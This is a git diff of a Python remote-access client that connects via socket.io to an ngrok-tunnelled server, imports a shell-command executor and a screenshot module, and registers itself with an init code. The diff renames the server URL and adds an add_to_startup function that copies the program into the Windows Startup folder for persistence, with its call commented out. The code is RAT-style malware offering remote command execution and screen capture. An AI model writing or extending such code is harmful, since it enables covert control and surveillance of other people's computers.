@@ -1,11 +1,16 @@
 import socketio
 from cmd_executer import execute_shell_command
-from random import randrange
 import requests
 from screenshot_utility import *
+from init_code_generator import *
 import atexit
+import sys
+import getpass
+from shutil import copy
 
-server_url = 'https://f080-89-178-159-143.ngrok.io'
+
+        
+SERVER_URL = 'https://c43d-89-178-159-143.ngrok.io'
 
 sio = socketio.Client()
 
@@ -31,18 +36,22 @@ def handle_reinitialization(data):
     sio.emit('command_response', str(initialization_code) + ' ')
 
 def initialize_client():
-    requests.post('{}/add-pending-client'.format(server_url), data={'init_code': str(initialization_code)})
+    requests.post('{}/add-pending-client'.format(SERVER_URL), data={'init_code': str(initialization_code)})
     print('Added to pending clients...')
-    requests.post('{}/wait-for-initialization'.format(server_url), data={'init_code': str(initialization_code)})
+    requests.post('{}/wait-for-initialization'.format(SERVER_URL), data={'init_code': str(initialization_code)})
     print('Initialized')
 
+def add_to_startup():
+    copy(sys.argv[0],'C:/Users/' + getpass.getuser() + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
+    
 def main():
-    sio.connect(server_url)
+    # add_to_startup()
+    sio.connect(SERVER_URL)
     # On program exit remove active client on server
-    atexit.register(lambda: requests.post('{}/remove-client'.format(server_url), data={'init_code': str(initialization_code)}))
+    atexit.register(lambda: requests.post('{}/remove-client'.format(SERVER_URL), data={'init_code': str(initialization_code)}))
 
     global initialization_code
-    initialization_code = randrange(10)
+    initialization_code = generate_init_code()
     print("Init code: ", initialization_code)
 
     initialize_client()
